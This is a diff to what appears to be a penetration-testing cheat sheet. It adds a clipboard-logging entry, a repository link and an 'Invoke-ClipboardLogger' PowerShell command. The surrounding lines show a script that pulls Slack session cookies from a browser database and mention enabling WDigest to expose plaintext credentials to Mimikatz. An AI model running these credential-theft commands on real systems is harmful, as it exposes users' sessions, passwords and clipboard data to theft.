@@ -3341,6 +3341,13 @@ https://github.com/juliourena/plaintext/blob/master/Scripts/cookieextractor.py
 $ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
 ```
 
+- Clipboard
+
+```
+https://github.com/inguardians/Invoke-Clipboard/tree/master
+PS C:\> Invoke-ClipboardLogger
+```
+
 - Enable WDigest which user credentials in plaintext within memory, making them accessible to tools like Mimikatz for extraction
 
 ```
